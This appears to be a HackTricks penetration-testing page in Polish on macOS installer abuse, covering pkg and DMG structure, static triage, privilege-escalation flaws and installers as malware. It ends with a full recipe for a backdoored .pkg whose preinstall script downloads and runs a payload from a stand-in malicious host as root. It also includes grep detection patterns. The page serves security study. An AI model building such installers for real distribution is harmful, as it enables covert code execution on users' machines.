# Abuse macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje o Pkg

**Pakiet instalacyjny** macOS (znany również jako plik `.pkg`) to format pliku używany przez macOS do **dystrybucji software**. Pliki te przypominają **pudełko zawierające wszystko, czego potrzebuje dane oprogramowanie**, aby poprawnie się zainstalować i uruchomić.

Sam plik pakietu jest archiwum zawierającym **hierarchię plików i katalogów, które zostaną zainstalowane na komputerze docelowym**. Może również zawierać **skrypty** wykonujące zadania przed instalacją i po niej, takie jak konfigurowanie plików konfiguracyjnych lub usuwanie starych wersji software.

### Hierarchia

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Dostosowania (tytuł, tekst powitalny…) oraz kontrole skryptów/instalacji
- **PackageInfo (xml)**: Informacje, wymagania instalacji, lokalizacja instalacji, ścieżki do skryptów do uruchomienia
- **Bill of materials (bom)**: Lista plików do zainstalowania, zaktualizowania lub usunięcia wraz z uprawnieniami do plików
- **Payload (CPIO archive gzip compressed)**: Pliki do zainstalowania w `install-location` z PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Skrypty uruchamiane przed instalacją i po niej oraz dodatkowe zasoby wypakowane do tymczasowego katalogu w celu wykonania.

### Dekompresja
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Aby wyświetlić zawartość instalatora bez ręcznego jego rozpakowywania, możesz również użyć darmowego narzędzia [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Skróty do statycznego triage'u

Jeśli celem jest analiza, spróbuj **najpierw unikać otwierania pakietu za pomocą `Installer.app`**. Niektóre pakiety mogą wykonywać kod natychmiast po otwarciu ich przez Installer (na przykład za pośrednictwem `system.run()` lub wtyczek instalatora), dlatego ekstrakcja offline jest zwykle bezpieczniejszym punktem wyjścia.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Podstawowe informacje o DMG

Pliki DMG, czyli Apple Disk Images, to format plików używany przez Apple macOS dla obrazów dysków. Plik DMG jest zasadniczo **montowalnym obrazem dysku** (zawiera własny filesystem), który zawiera surowe dane blokowe, zazwyczaj skompresowane i czasami zaszyfrowane. Po otwarciu pliku DMG macOS **montuje go tak, jakby był fizycznym dyskiem**, umożliwiając dostęp do jego zawartości.

> [!CAUTION]
> Należy pamiętać, że instalatory **`.dmg`** obsługują **tak wiele formatów**, że w przeszłości niektóre z nich zawierające luki były wykorzystywane do uzyskania **kernel code execution**.

### Hierarchia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchia pliku DMG może różnić się w zależności od zawartości. Jednak w przypadku application DMG zwykle ma ona następującą strukturę:

- Top Level: Jest to root obrazu dysku. Często zawiera aplikację oraz ewentualnie link do folderu Applications.
- Application (.app): Jest to właściwa aplikacja. W macOS aplikacja jest zazwyczaj pakietem zawierającym wiele pojedynczych plików i folderów, które tworzą aplikację.
- Applications Link: Jest to skrót do folderu Applications w macOS. Jego celem jest ułatwienie instalacji aplikacji. Możesz przeciągnąć plik .app na ten skrót, aby zainstalować aplikację.

## Privesc przez abuse pkg

### Wykonywanie z publicznych katalogów

Jeśli skrypt pre lub post installation na przykład wykonuje się z **`/var/tmp/Installerutil`**, a attacker może kontrolować ten skrypt, może eskalować uprawnienia za każdym razem, gdy skrypt zostanie wykonany. Inny podobny przykład:<sup>[[1]](#references)[[3]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Jest to [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), którą wywołuje kilka installerów i updaterów, aby **wykonać coś jako root**. Funkcja ta przyjmuje jako parametr **path** do **file**, który ma zostać **wykonany**. Jeśli jednak attacker może **zmodyfikować** ten plik, będzie mógł **abuse** jego wykonania z uprawnieniami root, aby **eskalować uprawnienia**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Więcej informacji znajdziesz w tym wystąpieniu: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Nadużywanie środowiska i shebangów

Najnowsze błędy w PackageKit pokazały, że skrypty instalatorów są często wykonywane jako **zaufany kod root**, a jednocześnie w ich pobliżu nadal znajduje się kontekst kontrolowany przez atakującego. Podczas audytowania pakietów dostawców zwróć szczególną uwagę na:

- Interpretery powłoki, takie jak `#!/bin/zsh` / `#!/bin/bash`
- Wywołania takie jak `sudo -u $USER`, `launchctl asuser` lub dowolną logikę, która ufa zmiennym `$USER`, `$HOME`, `PATH`, `TMPDIR` albo ścieżkom względnym
- Interpretery inne niż powłoki, które mogą ładować kontrolowane przez użytkownika pliki inicjalizacyjne lub biblioteki
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
W przypadku błędu root-environment w PackageKit z 2024 roku (dziedziczenie `~/.zshenv` / `~/.bash*` podczas instalacji inicjowanych przez użytkownika) sprawdź [ogólną stronę o macOS privesc](../macos-privilege-escalation.md). Jeśli pakiet jest **Apple-signed**, ten sam błąd skryptu może stać się istotny dla **SIP/TCC**, ponieważ `system_installd` może posiadać `com.apple.rootless.install.heritable`; zobacz [stronę SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)[[6]](#references)</sup>

### Wykonywanie przez montowanie

Jeśli installer zapisuje do `/tmp/fixedname/bla/bla`, możliwe jest **utworzenie mounta** nad `/tmp/fixedname` z opcją noowners, dzięki czemu można **modyfikować dowolny plik podczas instalacji**, aby nadużyć procesu instalacji.

Przykładem jest **CVE-2021-26089**, które umożliwiło **nadpisanie skryptu periodic**, aby uzyskać execution jako root. Więcej informacji można znaleźć w prezentacji: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg jako malware

### Pusty payload

Możliwe jest wygenerowanie pliku **`.pkg`** zawierającego **skrypty pre- i post-install**, bez żadnego rzeczywistego payloadu poza malware znajdującym się w tych skryptach.<sup>[[2]](#references)</sup>

### JS w Distribution xml

Możliwe jest dodanie tagów **`<script>`** do pliku **distribution xml** pakietu. Kod zostanie wykonany i będzie mógł **wykonywać polecenia** za pomocą **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

W przypadku distribution packages zależy to zwykle od włączenia external scripts przez plik najwyższego poziomu `Distribution`, na przykład za pomocą `allow-external-scripts="true"`. Dlatego samo sprawdzenie `preinstall` / `postinstall` nie wystarcza: sam **Distribution XML** może zawierać hooki `installation-check` / `volume-check` oraz bezpośrednie ścieżki execution przez `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Złośliwy installer wykorzystujący skrypt i kod JS wewnątrz dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Odnośniki

- [1] [DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
